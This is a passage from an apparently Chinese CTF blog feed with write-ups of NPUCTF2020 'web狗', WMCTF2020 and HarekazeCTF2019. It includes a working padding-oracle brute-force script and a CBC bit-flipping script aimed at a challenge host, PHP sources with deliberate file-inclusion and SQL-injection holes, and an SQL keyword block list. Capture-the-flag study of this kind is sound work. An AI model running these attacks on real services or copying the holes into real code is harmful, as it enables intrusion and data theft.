punctuation">&#125;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"我摊牌了，就是懒得写前端"</span><span class="token operator">.</span><span class="token constant">BR</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'source'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>还给了HelloWorld.class</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//</span><span class="token comment">// Source code recreated from a .class file by IntelliJ IDEA</span><span class="token comment">// (powered by FernFlower decompiler)</span><span class="token comment">//</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">HelloWorld</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token class-name">HelloWorld</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var0<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"众所周知，你是一名WEB选手，掌握javaweb也是一项必备技能，那么逆向个java应该不过分吧？"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var10000 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token number">102</span><span class="token punctuation">,</span> <span class="token number">108</span><span class="token punctuation">,</span> <span class="token number">97</span><span class="token punctuation">,</span> <span class="token number">103</span><span class="token punctuation">,</span> <span class="token number">123</span><span class="token punctuation">,</span> <span class="token number">119</span><span class="token punctuation">,</span> <span class="token number">101</span><span class="token punctuation">,</span> <span class="token number">54</span><span class="token punctuation">,</span> <span class="token number">95</span><span class="token punctuation">,</span> <span class="token number">52</span><span class="token punctuation">,</span> <span class="token number">111</span><span class="token punctuation">,</span> <span class="token number">103</span><span class="token punctuation">,</span> <span class="token number">95</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">115</span><span class="token punctuation">,</span> <span class="token number">95</span><span class="token punctuation">,</span> <span class="token number">101</span><span class="token punctuation">,</span> <span class="token number">52</span><span class="token punctuation">,</span> <span class="token number">115</span><span class="token punctuation">,</span> <span class="token number">121</span><span class="token punctuation">,</span> <span class="token number">103</span><span class="token punctuation">,</span> <span class="token number">48</span><span class="token punctuation">,</span> <span class="token number">105</span><span class="token punctuation">,</span> <span class="token number">110</span><span class="token punctuation">,</span> <span class="token number">103</span><span class="token punctuation">,</span> <span class="token number">125</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>先看到HelloWorld.class，</p><p>一堆数字，很像是ascii码。</p><p>解个码</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-NPUCTF2020-web%E7%8B%97/image-20210927165543378.png"></p><p>这是干嘛？</p><p>先看看加密结果</p><pre class="line-numbers language-none"><code class="language-none">IV:6666666666666666ly7auKVQCZWum&#x2F;W&#x2F;4osuPA&#x3D;&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="Padding-Oracle攻击"><a href="#Padding-Oracle攻击" class="headerlink" title="Padding Oracle攻击"></a>Padding Oracle攻击</h3><blockquote><p>padding oracle针对的是加密算法中的CBC Mode，当加密算法使用CBC Mode时，如果满足攻击条件，那么<strong>利用Padding Oracle能够在不知道密钥的情况下，解密任意密文，或者构造出任意明文的合法密文</strong></p></blockquote><blockquote><p>针对的是CBC模式，而不是某一个加密算法，所以任何分组加密算法，只要使用了CBC模式，都会受到影响。此类加密算法包括AES、DES、3-DES、Blowfish</p></blockquote><p>条件：</p><ul><li>已知密文+IV(初始化向量)</li><li>可触发解密过程且知道密文解密结果</li></ul><p>cbc,IV已知，密文已知，</p><p>原理复杂，直接抄代码吧</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># coding:utf-8</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> base64<span class="token keyword">import</span> time<span class="token comment"># b'\x97.\xda\xb8\xa5P\t\x95\xae\x9b\xf5\xbf\xe2\x8b.&lt;'</span>CYPHERTEXT <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span><span class="token string">"ly7auKVQCZWum/W/4osuPA=="</span><span class="token punctuation">)</span><span class="token comment"># initialization vector</span>IV <span class="token operator">=</span> <span class="token string">"6666666666666666"</span><span class="token comment"># PKCS7 16个字节为1组</span>N <span class="token operator">=</span> <span class="token number">16</span><span class="token comment"># intermediaryValue ^ IV = plainText</span>middle <span class="token operator">=</span> <span class="token string">""</span>plainText <span class="token operator">=</span> <span class="token string">""</span><span class="token comment"># 爆破时不断需要更改的iv</span>iv <span class="token operator">=</span> <span class="token string">""</span>URL <span class="token operator">=</span> <span class="token string">"http://4772e5d6-efa2-4d4d-a22d-b9d7e03266bb.node4.buuoj.cn:81/index.php?source=1&amp;method=decrypt"</span><span class="token keyword">def</span> <span class="token function">xor</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    用于输出两个字符串对位异或的结果    """</span>    <span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>b<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">for</span> step <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> N <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    padding <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>step<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>step <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>step<span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">","</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""        iv由三部分组成：            待爆破位置 chr(0)*(N-step)             正在爆破位置 chr(i)             使 iv[N-step+1:] ^ middle = padding 的 xor(padding,middle)        """</span>        iv <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>N <span class="token operator">-</span> step<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">+</span> xor<span class="token punctuation">(</span>padding<span class="token punctuation">,</span> middle<span class="token punctuation">)</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"data"</span><span class="token punctuation">:</span> <span class="token string">"ly7auKVQCZWum/W/4osuPA=="</span><span class="token punctuation">,</span>            <span class="token string">"iv"</span><span class="token punctuation">:</span> iv        <span class="token punctuation">&#125;</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>URL<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> r<span class="token punctuation">.</span>text <span class="token operator">!=</span> <span class="token string">"False"</span><span class="token punctuation">:</span>            middle <span class="token operator">=</span> xor<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>step<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> middle            <span class="token keyword">print</span><span class="token punctuation">(</span>middle<span class="token punctuation">)</span>            <span class="token keyword">break</span>plainText <span class="token operator">=</span> xor<span class="token punctuation">(</span>middle<span class="token punctuation">,</span> IV<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>plainText<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>爆出FlagIsHere.php。整无语了，一开始抄的其他博客的代码，折腾半天跑不出来，最后发现那个博客少复制了一段……</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">KiDFHJhflXUyK/v/spFuuQ==<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token comment">#error_reporting(0);</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'config.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//$fl4g</span><span class="token function">define</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"METHOD"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"aes-128-cbc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">define</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"SECRET_KEY"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"6666666"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">get_iv</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">//生成随机初始向量IV</span>    <span class="token variable">$random_iv</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token number">16</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$random_iv</span><span class="token operator">.=</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token variable">$random_iv</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$lalala</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'piapiapiapia'</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'Identity'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'iv'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">get_iv</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'Identity'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">openssl_encrypt</span><span class="token punctuation">(</span><span class="token variable">$lalala</span><span class="token punctuation">,</span> <span class="token constant">METHOD</span><span class="token punctuation">,</span> <span class="token constant">SECRET_KEY</span><span class="token punctuation">,</span> <span class="token constant">OPENSSL_RAW_DATA</span><span class="token punctuation">,</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'iv'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'iv'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'iv'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$tmp_id</span> <span class="token operator">=</span> <span class="token function">openssl_decrypt</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'Identity'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token constant">METHOD</span><span class="token punctuation">,</span> <span class="token constant">SECRET_KEY</span><span class="token punctuation">,</span> <span class="token constant">OPENSSL_RAW_DATA</span><span class="token punctuation">,</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'iv'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$tmp_id</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$tmp_id</span> <span class="token operator">===</span><span class="token string single-quoted-string">'weber'</span><span class="token punctuation">)</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$fl4g</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="CBC翻转攻击"><a href="#CBC翻转攻击" class="headerlink" title="CBC翻转攻击"></a>CBC翻转攻击</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 块长度为128位=16个字节，需要补齐，填充模式是PK7</span>    t <span class="token operator">=</span> <span class="token number">16</span> <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>    p <span class="token operator">=</span> <span class="token string">r'\x'</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>zfill<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>s <span class="token operator">+</span> p <span class="token operator">*</span> t<span class="token punctuation">)</span><span class="token comment"># add('weber')</span><span class="token comment"># 在python3里，需要传入byte类型，否则将会自动解码hex，记得补齐</span>target <span class="token operator">=</span> <span class="token string">b'weber\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b'</span>  <span class="token comment"># 目标字符串</span>orginal <span class="token operator">=</span> <span class="token string">b'piapiapiapia\x04\x04\x04\x04'</span>  <span class="token comment"># 源字符串</span>iv <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span><span class="token string">'5g0fBClXjQo96618lfQHnw=='</span><span class="token punctuation">)</span>  <span class="token comment"># 初始向量</span>result <span class="token operator">=</span> <span class="token string">b''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    result <span class="token operator">+=</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>target<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> iv<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> orginal<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">b&#39;4QEcETI99mhXkM8WmvsIkA&#x3D;&#x3D;&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>一开始生成的<code>sRpq7ZA2Eo4vGkeq9EJp+Q==</code>不行，清理了下cookie就重新生成就OK了，难道是加号的缘故？</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-NPUCTF2020-web%E7%8B%97/image-20210927202640568.png"></p><p>原来正常操作是这个网盘能下载之前那个helloworld.class文件。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.cnblogs.com/zlhff/p/5519175.html">Padding Oracle Attack的一些细节与实现</a></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题笔记:[WMCTF2020]Make PHP Great Again 2.0</title>
      <link href="/p/2742432288.html"/>
      <url>/p/2742432288.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>关键字:[require_once]</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">require_once</span> <span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">require_once</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>之前做过1.0来着，2.0应该是把非预期解修复的版本。</p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>类似<a href="https://syunaht.com/p/2339718074.html">刷题笔记:[WMCTF2020]Make PHP Great Again</a></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> PHP代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题笔记:[HarekazeCTF2019]Sqlite Voting</title>
      <link href="/p/2831754538.html"/>
      <url>/p/2831754538.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>关键字:[sqlite|hex|整数溢出|replace|binascii]</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-HarekazeCTF2019-Sqlite-Voting/image-20210923000306595.png"></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'source'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token variable">$banword</span> <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token comment">// dangerous chars</span>    <span class="token comment">// " % ' * + / &lt; = > \ _ ` ~ -</span>    <span class="token string double-quoted-string">"[\"%'*+\\/&lt;=>\\\\_`~-]"</span><span class="token punctuation">,</span>    <span class="token comment">// whitespace chars</span>    <span class="token string single-quoted-string">'\s'</span><span class="token punctuation">,</span>    <span class="token comment">// dangerous functions</span>    <span class="token string single-quoted-string">'blob'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'load_extension'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'char'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'unicode'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'(in|sub)str'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'[lr]trim'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'like'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'glob'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'match'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'regexp'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'in'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'limit'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'order'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'union'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'join'</span>  <span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token variable">$regexp</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'|'</span><span class="token punctuation">,</span> <span class="token variable">$banword</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/i'</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$regexp</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-Type: text/json; charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// check user input</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'error'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'You must specify vote id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'error'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'Vote id contains dangerous chars'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// update database</span><span class="token variable">$pdo</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PDO</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'sqlite:../db/vote.db'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$pdo</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"UPDATE vote SET count = count + 1 WHERE id = $&#123;id&#125;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$res</span> <span class="token operator">===</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'error'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'An error occurred while updating database'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// succeeded!</span><span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token punctuation">[</span>  <span class="token string single-quoted-string">'message'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'Thank you for your vote! The result will be published after the CTF finished.'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="题解"><a href="#题解" 